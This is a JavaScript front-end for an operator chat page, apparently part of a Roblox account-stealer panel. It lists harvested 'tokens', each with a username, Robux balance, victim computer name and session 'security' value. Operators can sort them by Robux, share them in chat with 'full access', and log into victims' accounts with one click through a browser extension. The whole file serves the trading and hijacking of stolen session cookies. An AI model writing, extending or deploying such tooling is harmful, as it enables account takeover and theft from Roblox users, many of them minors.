// ── Чат операторов ─────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('chat');
bindLogout();

let chatMessages = [];
let userTokens = [];
let attachedToken = null;
let attachedImageBase64 = null;
let isSending = false;

let pickerSortMode = 'date'; // 'date' | 'robux' | 'login'
let pickerSearchQuery = '';

// ── Загрузка сообщений ────────────────────────────────────────────────────────
async function loadChatMessages(autoScroll = false) {
  const container = document.getElementById('chatMessages');
  try {
    const resp = await apiFetch('/api/chat/messages');
    if (!resp.ok) return;
    const list = await resp.json();
    if (Array.isArray(list)) {
      chatMessages = list;
      localStorage.setItem('ft_cached_chat_messages', JSON.stringify(list));
      localStorage.setItem('ft_last_read_chat_time', String(Date.now()));
      const badge = document.getElementById('sidebarChatBadge');
      if (badge) badge.style.display = 'none';
      renderChatMessages(autoScroll);
    }
  } catch (e) {
    if (e.message !== 'auth') {
      // ignore
    }
  }
}

// ── Отрисовка сообщений ───────────────────────────────────────────────────────
function renderChatMessages(autoScroll = true) {
  const container = document.getElementById('chatMessages');
  if (!container) return;

  if (!chatMessages.length) {
    container.innerHTML = '<div class="empty" style="margin: auto;">В чате пока нет сообщений. Напишите первым!</div>';
    return;
  }

  const isScrolledToBottom = container.scrollHeight - container.clientHeight <= container.scrollTop + 60;

  let html = '';
  for (const msg of chatMessages) {
    const sender = escapeHtml(msg.displayName || msg.operator || 'Operator');
    const timeStr = msg.createdAt ? new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
    const text = escapeHtml(msg.text || '');

    let avatarHtml = `<div class="chat-msg-avatar">${sender.charAt(0).toUpperCase()}</div>`;
    if (msg.avatarImage) {
      avatarHtml = `<div class="chat-msg-avatar"><img src="${msg.avatarImage}" alt="avatar"></div>`;
    }

    let tokenCardHtml = '';
    if (msg.tokenCard) {
      const tc = msg.tokenCard;
      const tUser = escapeHtml(tc.username || 'Roblox User');
      const tRobux = Number(tc.robux) || 0;
      const tRobuxStr = tRobux > 0 ? tRobux.toLocaleString() + ' R$' : '0 R$';
      const tPc = escapeHtml(tc.computer || '—');

      let tAvatarHtml = `<div class="chat-token-showcase-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>`;
      if (tc.userId) {
        tAvatarHtml = `<div class="chat-token-showcase-avatar"><img src="${API_BASE}/avatar-proxy/${tc.userId}" onerror="this.outerHTML='<div class=\\'chat-token-showcase-avatar\\'>O</div>'"></div>`;
      }

      let loginBtnHtml = '';
      let accessBadgeHtml = `<span class="chat-card-badge-view">Только баланс</span>`;

      if (tc.hasAccess && tc.security) {
        accessBadgeHtml = `<span class="chat-card-badge-access">Полный доступ</span>`;
        const tokenEscaped = escapeHtml(tc.security).replace(/'/g, "\\'");
        const fileEscaped = escapeHtml(tc.file || '').replace(/'/g, "\\'");
        loginBtnHtml = `<button class="btn-login btn-sm" style="padding: 0.4rem 0.9rem; font-size: 0.85rem;" onclick="loginFromChat('${tokenEscaped}', this, '${fileEscaped}')">Войти</button>`;
      }

      tokenCardHtml = `
        <div class="chat-token-showcase ${tc.hasAccess ? 'has-access' : ''}">
          ${tAvatarHtml}
          <div class="chat-token-showcase-details">
            <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
              <span class="chat-token-showcase-user">${tUser}</span>
              ${accessBadgeHtml}
            </div>
            <div class="chat-token-showcase-sub">ПК: ${tPc}</div>
          </div>
          <div style="display:flex; align-items:center; gap:8px;">
            <div class="chat-token-showcase-robux">${tRobuxStr}</div>
            ${loginBtnHtml}
          </div>
        </div>
      `;
    }

    let imageHtml = '';
    if (msg.image) {
      imageHtml = `
        <div class="chat-msg-image-wrap">
          <img src="${msg.image}" class="chat-msg-image" alt="attachment" onclick="openImageViewer('${msg.image}')">
        </div>
      `;
    }

    html += `
      <div class="chat-msg-row">
        ${avatarHtml}
        <div class="chat-msg-content">
          <div class="chat-msg-meta">
            <span class="chat-msg-sender">${sender}</span>
            <span class="chat-msg-time">${timeStr}</span>
          </div>
          ${text ? `<div class="chat-msg-text">${text}</div>` : ''}
          ${imageHtml}
          ${tokenCardHtml}
        </div>
      </div>
    `;
  }

  container.innerHTML = html;

  if (autoScroll || isScrolledToBottom) {
    container.scrollTop = container.scrollHeight;
  }
}

// ── Вход в Roblox из карточки в чате ──────────────────────────────────────────
function loginFromChat(token, btn, fileId) {
  if (!token) return;
  btn.textContent = 'Вход...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          const nowTs = Date.now();
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId, timestamp: nowTs })
          }).catch(()=>{});
          localStorage.setItem('login_' + fileId, String(nowTs));
        }
        btn.textContent = 'Вошли';
        btn.className = 'btn-login logged-in btn-sm';
        btn.disabled = false;
        toast('Вход выполнен, открываем Roblox...');
      } else {
        btn.textContent = 'Войти';
        btn.disabled = false;
        toast('Установите расширение NEXUS для входа', 'err');
      }
    }
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    btn.textContent = 'Войти';
    btn.disabled = false;
    toast('Установите расширение NEXUS для входа', 'err');
  }, 800);
}

// ── Отправка сообщения ────────────────────────────────────────────────────────
async function sendMessage() {
  if (isSending) return;
  const input = document.getElementById('chatInput');
  const text = input ? input.value.trim() : '';

  if (!text && !attachedToken && !attachedImageBase64) {
    return;
  }

  isSending = true;
  const btn = document.getElementById('btnSendChat');
  if (btn) btn.disabled = true;

  try {
    const payload = {
      text: text,
      image: attachedImageBase64 || null,
      tokenCard: attachedToken ? {
        username: attachedToken.username || attachedToken.user,
        userId: attachedToken.userId,
        robux: attachedToken.robux || 0,
        computer: attachedToken.computer,
        hasAccess: Boolean(attachedToken.hasAccess),
        security: attachedToken.hasAccess ? attachedToken.security : null,
        file: attachedToken.hasAccess ? attachedToken.file : null
      } : null
    };

    const resp = await apiFetch('/api/chat/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (resp.ok) {
      if (input) input.value = '';
      detachToken();
      detachImage();
      await loadChatMessages(true);
    } else {
      toast('Ошибка отправки сообщения', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  } finally {
    isSending = false;
    if (btn) btn.disabled = false;
    if (input) input.focus();
  }
}

// ── Обработка изображений (Сжатие + Base64) ──────────────────────────────────
function processImageFile(file) {
  if (!file || !file.type.startsWith('image/')) {
    toast('Пожалуйста, выберите файл изображения', 'err');
    return;
  }

  const reader = new FileReader();
  reader.onload = function(e) {
    const img = new Image();
    img.onload = function() {
      const maxDim = 1200;
      let w = img.width;
      let h = img.height;
      if (w > maxDim || h > maxDim) {
        if (w > h) {
          h = Math.round((h * maxDim) / w);
          w = maxDim;
        } else {
          w = Math.round((w * maxDim) / h);
          h = maxDim;
        }
      }

      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, w, h);

      attachedImageBase64 = canvas.toDataURL('image/jpeg', 0.85);

      const previewBox = document.getElementById('attachedImagePreview');
      const previewThumb = document.getElementById('attachedImageThumb');
      const previewName = document.getElementById('attachedImageName');

      if (previewThumb) previewThumb.src = attachedImageBase64;
      if (previewName) previewName.textContent = file.name || 'Изображение (' + Math.round(attachedImageBase64.length / 1024) + ' KB)';
      if (previewBox) previewBox.style.display = 'flex';

      document.getElementById('chatInput')?.focus();
    };
    img.src = e.target.result;
  };
  reader.readAsDataURL(file);
}

function detachImage() {
  attachedImageBase64 = null;
  const previewBox = document.getElementById('attachedImagePreview');
  if (previewBox) previewBox.style.display = 'none';
  const fileInput = document.getElementById('chatFileInput');
  if (fileInput) fileInput.value = '';
}

document.getElementById('btnAttachImage')?.addEventListener('click', () => {
  document.getElementById('chatFileInput')?.click();
});

document.getElementById('chatFileInput')?.addEventListener('change', function() {
  if (this.files && this.files[0]) {
    processImageFile(this.files[0]);
  }
});

// Поддержка Ctrl+V вставки картинок
document.getElementById('chatInput')?.addEventListener('paste', function(e) {
  if (e.clipboardData && e.clipboardData.items) {
    const items = e.clipboardData.items;
    for (let i = 0; i < items.length; i++) {
      if (items[i].type.indexOf('image') !== -1) {
        const file = items[i].getAsFile();
        if (file) {
          processImageFile(file);
          e.preventDefault();
          break;
        }
      }
    }
  }
});

// Drag & drop картинок
const dropZone = document.getElementById('chatDropZone');
if (dropZone) {
  ['dragenter', 'dragover'].forEach(eventName => {
    dropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      dropZone.classList.add('drag-active');
    }, false);
  });
  ['dragleave', 'drop'].forEach(eventName => {
    dropZone.addEventListener(eventName, (e) => {
      e.preventDefault();
      dropZone.classList.remove('drag-active');
    }, false);
  });
  dropZone.addEventListener('drop', (e) => {
    const dt = e.dataTransfer;
    if (dt && dt.files && dt.files[0]) {
      processImageFile(dt.files[0]);
    }
  });
}

// ── Просмотр полноразмерных картинок ──────────────────────────────────────────
function openImageViewer(src) {
  const modal = document.getElementById('imageViewerModal');
  const img = document.getElementById('imageViewerImg');
  if (modal && img) {
    img.src = src;
    modal.classList.add('active');
  }
}

function closeImageViewer() {
  const modal = document.getElementById('imageViewerModal');
  if (modal) modal.classList.remove('active');
}

// ── Выбор токена для прикрепления (Поиск, Сортировка, Доступ) ───────────────────
document.getElementById('btnOpenTokenPicker')?.addEventListener('click', async () => {
  const modal = document.getElementById('tokenPickerModal');
  const listEl = document.getElementById('tokenPickerList');
  if (modal) modal.classList.add('active');

  if (listEl) {
    listEl.innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 1.5rem;">Загрузка токенов...</div>';
  }

  try {
    const resp = await apiFetch('/tokens-data');
    if (resp.ok) {
      userTokens = await resp.json();
      renderTokenPickerList();
    } else {
      if (listEl) listEl.innerHTML = '<div class="empty">Не удалось загрузить токены</div>';
    }
  } catch (e) {
    if (listEl) listEl.innerHTML = '<div class="empty">Ошибка сети</div>';
  }
});

function closeTokenPicker() {
  const modal = document.getElementById('tokenPickerModal');
  if (modal) modal.classList.remove('active');
}

function renderTokenPickerList() {
  const listEl = document.getElementById('tokenPickerList');
  if (!listEl) return;

  let list = [...userTokens].filter(t => t.valid);

  if (pickerSearchQuery) {
    const q = pickerSearchQuery.toLowerCase();
    list = list.filter(t => 
      ((t.username || t.user || '').toLowerCase().includes(q)) || 
      ((t.computer || '').toLowerCase().includes(q))
    );
  }

  if (pickerSortMode === 'robux') {
    list.sort((a, b) => (Number(b.robux) || 0) - (Number(a.robux) || 0));
  } else if (pickerSortMode === 'login') {
    list.sort((a, b) => (Number(b.lastLogin) || 0) - (Number(a.lastLogin) || 0));
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  if (!list.length) {
    listEl.innerHTML = '<div class="empty" style="padding:1.5rem;">Токены не найдены</div>';
    return;
  }

  let html = '';
  list.forEach(t => {
    const username = escapeHtml(t.username || t.user || 'Roblox User');
    const robux = (t.robux !== undefined && t.robux !== null) ? Number(t.robux).toLocaleString() + ' R$' : '0 R$';
    const pc = escapeHtml(t.computer || '—');

    const rawId = t.file || t.userId || username;
    const tokenSerialized = escapeHtml(JSON.stringify({
      username: t.username || t.user,
      userId: t.userId,
      robux: t.robux,
      computer: t.computer,
      security: t.security,
      file: t.file
    })).replace(/'/g, "\\'");

    html += `
      <div class="token-picker-item" onclick="attachTokenFromData('${tokenSerialized}')">
        <div style="display:flex; flex-direction:column; gap:2px; min-width:0;">
          <div style="font-weight:700; color:#fff; font-size:0.92rem;">${username}</div>
          <div style="font-size:0.78rem; color:var(--text-muted);">ПК: ${pc}</div>
        </div>
        <div class="chat-token-showcase-robux">${robux}</div>
      </div>
    `;
  });

  listEl.innerHTML = html;
}

function attachTokenFromData(jsonStr) {
  try {
    const t = JSON.parse(jsonStr);
    const hasAccess = document.getElementById('chkGrantFullAccess')?.checked || false;
    attachedToken = {
      ...t,
      hasAccess: hasAccess
    };

    const previewBox = document.getElementById('attachedTokenPreview');
    const previewText = document.getElementById('attachedTokenText');
    const accessBadge = document.getElementById('attachedTokenAccessBadge');
    const username = t.username || 'Roblox User';
    const robux = (t.robux !== undefined && t.robux !== null) ? Number(t.robux).toLocaleString() + ' R$' : '0 R$';

    if (previewText) previewText.textContent = `${username} (${robux})`;
    if (accessBadge) {
      accessBadge.textContent = hasAccess ? 'Полный доступ (кнопка Войти)' : 'Только баланс';
      accessBadge.className = hasAccess ? 'token-access-pill is-full' : 'token-access-pill';
    }
    if (previewBox) previewBox.style.display = 'flex';

    closeTokenPicker();
    document.getElementById('chatInput')?.focus();
  } catch (e) {}
}

function detachToken() {
  attachedToken = null;
  const previewBox = document.getElementById('attachedTokenPreview');
  if (previewBox) previewBox.style.display = 'none';
}

// ── Сортировка и поиск в Picker ───────────────────────────────────────────────
document.getElementById('tokenPickerSearch')?.addEventListener('input', function() {
  pickerSearchQuery = this.value.trim();
  renderTokenPickerList();
});

document.getElementById('pickerSortDate')?.addEventListener('click', function() {
  pickerSortMode = 'date';
  document.querySelectorAll('#tokenPickerModal .sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderTokenPickerList();
});

document.getElementById('pickerSortRobux')?.addEventListener('click', function() {
  pickerSortMode = 'robux';
  document.querySelectorAll('#tokenPickerModal .sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderTokenPickerList();
});

document.getElementById('pickerSortLogin')?.addEventListener('click', function() {
  pickerSortMode = 'login';
  document.querySelectorAll('#tokenPickerModal .sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderTokenPickerList();
});

// ── Слушатели отправки ────────────────────────────────────────────────────────
document.getElementById('btnSendChat')?.addEventListener('click', sendMessage);

document.getElementById('chatInput')?.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    sendMessage();
  }
});

// Загрузка сообщений и периодический опрос (polling)
loadChatMessages(true);
setInterval(() => {
  loadChatMessages(false);
}, 3000);
